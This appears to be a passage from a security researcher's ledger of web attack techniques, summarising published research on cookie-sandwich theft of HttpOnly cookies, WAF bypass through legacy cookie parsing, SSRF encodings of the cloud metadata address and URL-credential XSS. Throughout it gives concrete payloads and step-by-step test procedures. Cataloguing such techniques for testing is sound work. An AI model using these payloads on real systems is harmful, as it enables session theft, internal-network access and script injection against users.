`codepoint % 256` = 0 hits across the three write targets; `WorstFit` (3/3 hits) is Windows Best-Fit ANSI conversion at the OS layer and §17.109 is a fixed 256-BYTE hostname truncation (string LENGTH between validator and resolver) — neither is codepoint-modulus truncation. TRANSFERABLE TEST: for every character the target blocks, send `chr(ord(c)+256)`, `chr(ord(c)+512)`, … (JS paths: `String.fromCharCode(0x10000 + code)`); if the behaviour matches sending the raw blocked character, the pipeline truncates and the blocklist is decoration. Slot 17.247. UNVERIFIED (not reproduced) — no byte-truncating sink was built or tested.

§17.248 — A SERVER THAT STARTS LEGACY PARSING ON `$Version=1` (OR ON A `"`-OPENED VALUE) READS EVERYTHING UP TO THE NEXT UNESCAPED QUOTE AS ONE VALUE: SANDWICH THE HttpOnly COOKIE BETWEEN TWO ATTACKER-SET QUOTED COOKIES, ORDER THEM WITH THE `path` ATTRIBUTE, AND READ THE SECRET BACK FROM ANY COOKIE-REFLECTING ENDPOINT — CREDENTIALED CORS COUNTS (PortSwigger, "Stealing HttpOnly cookies with the cookie sandwich technique", Zakhar Fedotkin @zakfedotkin, published 22 January 2025, updated 30 June 2025; read in full this pass — `curl` + desktop UA + local strip, 14,810 chars; part 2 of the cookie-parsing series). THE PARSER: Apache Tomcat "handles both RFC6265 and RFC2109 standards, defaulting to legacy parsing logic if a string starts with the special `$Version` attribute", and "if cookie value starts with double quotes, it will continue reading until the next unescaped double quotes char" (it also unescapes after `\`). THE BUILD (from JavaScript, because Chrome does not implement legacy cookies so it lets JS create a name starting with `$`): `document.cookie = '$Version=1;'`; `document.cookie = 'param1="start'`; `document.cookie = 'param2=end";'` → wire `Cookie: $Version=1; param1="start; sessionId=secret; param2=end"` → server `Set-Cookie: param1="start; sessionId=secret; param2=end";` with the HttpOnly cookie folded into `param1`. ORDERING (the part that works against a victim you cannot set cookies for): "For the `$Version` cookie to be sent first, it must either be created earlier or have a path attribute longer than all other cookies. While we cannot control the creation time of the victim's cookie, we can manipulate the path attribute" — `$Version` and the opening cookie get `Path=/json` (the reflected endpoint's own path), the closing cookie gets `Path=/`. TARGET: an endpoint that "reflects cookie value in the response body" and "allows cross origin request from vulnerable domain" (case study: `GET /json?session=ignored` with `Origin: https://www.example.com`, response `Access-Control-Allow-Origin: https://www.example.com` + `Access-Control-Allow-Credentials: true`, body `{"session":"deadbeef"}`; the URL parameter is mandatory but the server overwrites it from the Cookie header). DELIVERY in the write-up: reflected XSS on an error page whose WAF (AWS) was beaten with an unpatched handler — `<link rel="canonical" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">` (credit @garethheyes). PYTHON VARIANT: Flask/Django "support quoted strings by default, eliminating the need for the special $Version attribute" and encode the separator as octal — `Cookie: param1="start; sessionId=secret; param2=end"` → `Set-Cookie: param1="start\073 sessionId=secret\073 param2=end";`. SCOPE/FIX: Tomcat 8.5.x/9.0.x/10.0.x default to RFC2109; disable legacy support. WHY IT IS A NEW GENERAL METHOD: `cookie sandwich` appears in the three write targets ONLY inside the Cookie Chaos entry's dedupe lines and a 0-hit dedupe list, `RFC2109` = 0 hits, and `$Version` is recorded only as Cookie Chaos's cookie-NAME normaliser (`$Version=1,__Host-<name>=x`) — a prefix bypass, not the quoted-value sandwich. TRANSFERABLE TEST: send `Cookie: $Version=1; session="deadbeef; <HttpOnlyCookieName>=secret; dummy=qaz"` (Tomcat) or `Cookie: param1="start; <HttpOnlyCookieName>=secret; param2=end"` (Flask/Django) to any endpoint that reflects a cookie and look for the whole sandwiched string; then confirm client-side ordering is possible via `path=`. Slot 17.248. UNVERIFIED (not reproduced) — no Tomcat/Flask pair, CORS endpoint or victim cookie jar was stood up.

§17.249 — THE WAF READS THE RAW Cookie HEADER AND THE BACKEND RE-PARSES IT: FORCE LEGACY PARSING WITH `$Version=1`, HAND THE VALUE OVER AS A QUOTED BACKSLASH- OR OCTAL-ESCAPED STRING, HIDE COOKIE NAMES AFTER A `, `, OR SPLIT THE HEADER IN TWO AND LET AN INLINE COMMENT ABSORB THE SERVER'S JOINING COMMA (PortSwigger, "Bypassing WAFs with the phantom $Version cookie", Zakhar Fedotkin @zakfedotkin, published 4 December 2024, updated 30 June 2025; read in full this pass — `curl` + desktop UA + local strip, 13,056 chars; part 1 of the series). THE HEADER IS LEGAL AND PARSED DIFFERENTLY BY EVERY STACK: `Cookie: $Version=1; foo="bar"; $Path="/"; $Domain=abc;` → Flask/Django `{"foo":"bar","$Version":"1","$Path":"/","$Domain":"abc"}` (quotes stripped), PHP/Ruby `"foo":"\"bar\""` (quotes kept), Spring `foo` only, `SimpleCookie` `foo=bar`. Tomcat switches to RFC2109 on `$Version`, honours `$Path`/`$Domain` ("may enable users to change reflected cookie attributes") and "will also unescape any character starting with backslash" (`foo="\b\a\r"` → `foo="bar"`). QUOTED-STRING ENCODING vs VALUE ANALYSIS: RFC 2068 — "many HTTP/1.1 header field values consist of words separated by LWS or special characters. These special characters MUST be in a quoted string to be used within a parameter value"; AWS WAF verdicts from the post: `eval()` allowed, `eval('test')` forbidden, `"\e\v\a\l\(\'t\e\s\t\'\)"` ALLOWED, and `"\145\166\141\154\050\047\164\145\163\164\047\051"` ALLOWED because Python frameworks "automatically decode octal escape sequences within quoted strings" (`\012`=LF, `\015`=CR, `\073`=`;`). COMMA SEPARATOR vs NAME BLOCKLISTS: "a server should also accept a comma (,) as a separator between cookie values" → `$Version=1; foo=bar, abc = qux` gives `"abc": "qux"`, and "the specification permits any number of space or tab characters before or after the equal sign". REPEATED HEADERS: Ruby/PHP/Django/Flask "combine headers into a single comma-separated string" (`Cookie: param1=value1;` + `Cookie: param2=value2;` → `",param2"` / `",_param2"` / `", param2"`; Spring keeps them separate), and the published bypass is `Cookie: name=eval('test//` + `Cookie: comment')` → "Resulting cookie: name=eval('test//, comment') => allowed" — the server's own joining comma lands inside an inline comment. TOOLING: implemented in Param Miner; the Burp `HttpHandler` snippet rewrites every parameter as `$Version=1; name="\<char>"`. WHY IT IS A NEW GENERAL METHOD: `RFC2109`, `quoted-string`, `comma separator`, `header continuation`, `RFC2068` = 0 hits; `octal escape` hits (A 2 / C 3) are the CSS `\00003c` sanitizer-rewriter family (a different decoder); `$Version` is recorded only as Cookie Chaos's name normaliser. TRANSFERABLE TEST: take a payload the WAF blocks in a cookie and resend it quoted+backslash-escaped, then octal-escaped, then split over two `Cookie:` headers with `//` before the break, then with the NAME hidden after `, `. Slot 17.249. UNVERIFIED (not reproduced) — no WAF, Tomcat or Flask instance was stood up.

§17.250 — DELTA: AN IPv4 ADDRESS IS ONE 32-BIT INTEGER AND A URL AUTHORITY HAS A USERINFO SEGMENT — VALIDATORS STRING-MATCH WHILE CLIENTS NORMALISE, SO RETRY THE SAME INTERNAL HOST AS PARTIAL-DECIMAL (CLASS B `<a>.<b>.<c*256+d>`, CLASS A `<a>.<b*65536+c*256+d>`), PER-SEGMENT MIXED RADIX, DIGIT-NORMALISED FORMS, OR BEHIND A `[...]`-BEARING USERINFO (SPRING `UriComponentsBuilder`), AND TEST `{`/`}`/BACKTICK DOMAINS AGAINST EVERY REGEX ORIGIN ALLOW-LIST (PortSwigger, "New crazy payloads in the URL Validation Bypass Cheat Sheet", Zakhar Fedotkin @zakfedotkin, published 29 October 2024, updated 22 November 2024; read in full this pass — `curl` + desktop UA + local strip, 8,858 chars; community payloads from @e1abrador, @SeanPesce, @t0xodile; the userinfo payload is MASKED in the page source as `https://***@attacker.com`, the prose names the `[` character). NEW IP NOTATIONS for the cloud metadata address 169.254.169.254, "supported by Chrome, Firefox, Safari": `169.254.43518` (Partial Decimal Class B — "combines the third and fourth parts"), `169.16689662` (Partial Decimal Class A — "combines the second, third, and fourth parts"), `0xA9.254.0251.0376` (Mixed Encodings — "each segment … in different formats: hexadecimal, decimal, or octal"); check: 169*256+254 = 43518, 254*65536+169*256+254 = 16689662. NORMALISATION ENCODINGS: "Circled Latin letters and numbers, Fullwidth Forms, or even Seven-segment display characters" can be applied to the generated host (aimed at the normalise/blocklist stage, not the resolver). IPv6: expansion plus extraction of an embedded IPv4 into all the v4 formats. USERINFO DIFFERENTIAL: "the 'left square bracket' character `[` in the userinfo segment can cause Spring's UriComponentsBuilder to return a hostname value that differs from how major browsers interpret it. This discrepancy can potentially lead to vulnerabilities such as open redirects or SSRF". CORS ALLOW-LIST BYPASS: `https://example.com.{.web-attacker.com/`, `https://example.com.}.web-attacker.com/`, ``https://example.com.`.web-attacker.com/`` — "an edge case related to localhost regex implementations and Safari-specific domain splitting attacks". WHY IT IS A DELTA (not a re-record): the ledger already lists userinfo `@` tricks and generic decimal/octal/hex IPv4 (`2130706433`, `0x7f000001`, `0177.0.0.1`); `UriComponentsBuilder`, `partial decimal`, `0xA9`, `169.254.43518`, `circled`, `seven-segment`, `web-attacker`, `example.com.{`, `localhost regex` = 0 hits. TRANSFERABLE TEST: for every URL/SSRF parameter, send the same internal target as Class B, Class A, per-segment mixed radix, IPv6 (plus embedded v4), then with `[` in the userinfo, then a `{`/`}`/backtick/trailing-dot sibling against any origin regex. Slot 17.250. UNVERIFIED (not reproduced) — browsers and a Spring instance were not exercised.

§17.251 — `location` HIDES URL CREDENTIALS AND `document.URL` KEEPS THEM: CONCEAL THE PAYLOAD BEFORE THE `@` WHERE QUERY/HASH FILTERS NEVER LOOK — FIREFOX DOES NOT ENCODE `'`, SO IT BREAKS OUT OF JS STRINGS, AND EVERY ANCHOR'S `username`/`password` INHERIT THE PARENT CREDENTIALS, WHICH IS A DOM-CLOBBERING PRIMITIVE FOR ANY OBJECT THE APP READS THOSE FIELDS FROM (PortSwigger, "Concealing payloads in URL credentials", Gareth Heyes @garethheyes, published 23 October 2024, updated 23 October 2024; read in full this pass — `curl` + desktop UA + local strip, 8,322 chars; builds on Johan Carlsson's original concealment discovery; payloads are MASKED in the page source as `https://***@<host>` and are reproduced as-is). THE PROPERTY DIFFERENCE: `https://foo:bar@portswigger-labs.net` → `alert(location)` = `https://portswigger-labs.net/` while `alert(document.URL)` = `https://foo:bar@portswigger-labs.net/` — "document.URL contains the credentials part of the URL whereas location doesn't"; Chrome and Firefox hide the credentials in the address bar and the payload "even persists through same origin navigations". READING IT BACK: `https://***@portswigger-labs.net` + `<img src onerror=alert(URL.slice(8,16))>` — "you can use just URL inside an event [handler to] grab the payload from the credentials". REVIVING A DEAD DOM XSS: after fuzzing which characters the credentials segment encodes (Shazzer vector linked), "Firefox doesn't URL-encode single quotes" — so against `function getBase(url){return url.split(/[?#]/)[0];}` + `document.write(\`<script>const url='${getBase(document.URL)}';<\/script>\`)` the credentials payload closes the single-quoted string, "particularly useful in DOM XSS scenarios, if the site removes the query string and hash"; delivered by "redirection or user navigation". ANCHOR CLOBBERING: every `<a>` has `username`/`password` properties holding the URL credentials and "If it's a relative link, it inherits the parent credentials" — `https://***@example.com` + `<a href=# onclick=alert(username)>test</a>`; full clobber payload `https://user:pass@example.com` + `<a href id=x>test</a>` + `eval(x.username)//user` / `eval(x.password)//pass` ("You can combine this with DOM Clobbering to give you control over objects with username or password properties"; a blank `href` still works). LIMITS: "Safari discards URL credentials. All the examples shown only work on Chrome and Firefox. Also Chrome blocks sub-resources from using URL credentials" — top-level navigation/redirect only. WHY IT IS A NEW GENERAL METHOD: `document.URL` hits in C (5) are generic DOM-XSS source lists (`location.*`, `document.URL`, `window.name`, …); `credentials part`, `anchor username`, `password property`, `concealed payload`, `Shazzer` = 0 hits across the three write targets. TRANSFERABLE TEST: on any DOM-XSS candidate whose vector dies on `?`/`#` stripping, retry with the payload in the authority (`https://<payload>@<host>/<path>`, via redirect or navigation) and check whether the site reads `document.URL`/`URL` (not `location`) into HTML or a quoted JS string; in parallel add `<a href id=x>test</a>` under a credential-bearing parent URL and see whether app code reads `x.username`/`x.password`. Slot 17.251. UNVERIFIED (not reproduced) — no browser lab was run.
